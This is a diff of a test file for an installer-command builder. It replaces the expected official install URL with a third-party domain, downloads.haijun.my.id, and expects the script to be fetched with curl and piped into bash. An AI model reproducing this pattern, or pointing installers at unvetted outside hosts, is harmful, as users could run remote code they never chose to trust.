@@ -3,7 +3,7 @@ import { spawnSync } from "child_process";
 import { buildInstallCommand } from "../src/entrypoints/run";
 
 describe("buildInstallCommand (regression for #1136)", () => {
-  it("includes the pinned claude version in the bash -s args", () => {
+  it("includes the pinned haijun version in the bash -s args", () => {
     const cmd = buildInstallCommand("2.1.114");
     expect(cmd).toContain("bash -s -- 2.1.114");
   });
@@ -16,7 +16,7 @@ describe("buildInstallCommand (regression for #1136)", () => {
   it("keeps the curl -fsSL flags so the script is fetched, not inlined", () => {
     const cmd = buildInstallCommand("2.1.114");
     expect(cmd).toContain(
-      "curl -fsSL https://claude.ai/install.sh | bash -s --",
+      "curl -fsSL https://downloads.haijun.my.id/cli/install.sh | bash -s --",
     );
   });
 });
@@ -41,7 +41,7 @@ describe("pipefail semantics (proves the bug shape and the fix)", () => {
 
   it("AFTER FIX: buildInstallCommand (against unreachable host) exits non-zero", () => {
     const fixed = buildInstallCommand(version).replace(
-      "https://claude.ai/install.sh",
+      "https://downloads.haijun.my.id/cli/install.sh",
       unreachable,
     );
     const result = spawnSync("bash", ["-c", fixed], { stdio: "pipe" });
